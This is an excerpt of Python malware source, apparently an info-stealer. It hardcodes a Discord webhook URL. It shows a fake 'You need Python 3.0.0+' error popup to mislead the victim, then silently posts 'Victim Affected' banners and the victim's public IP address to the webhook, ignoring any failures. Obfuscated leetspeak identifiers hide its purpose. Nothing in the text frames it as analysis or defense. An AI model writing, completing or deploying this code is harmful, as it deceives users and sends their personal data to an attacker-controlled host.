...
w3bh00k_ur1 = "https://discord.com/api/webhooks/1333917230853001357/Ke61cSMsoZuU6pOxGCYo6qeBTRo1o-JhzSrkhmwYeDAPa82S_vx3eXILyCorqZutpEXW"
...
def F4k3_3rr0r():
    ...
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Update", "You beed Python 3.0.0+")
...
try: requests.post(w3bh00k_ur1, json={'content': f'****╔═════════════════Victim Affected═════════════════╗****', 'username': username_embed, 'avatar_url': avatar_embed,})
except: pass
...
try: requests.post(w3bh00k_ur1, json={'content': f'****╚══════════════════{ip_address_public}══════════════════╝****', 'username': username_embed, 'avatar_url': avatar_embed})
except: pass
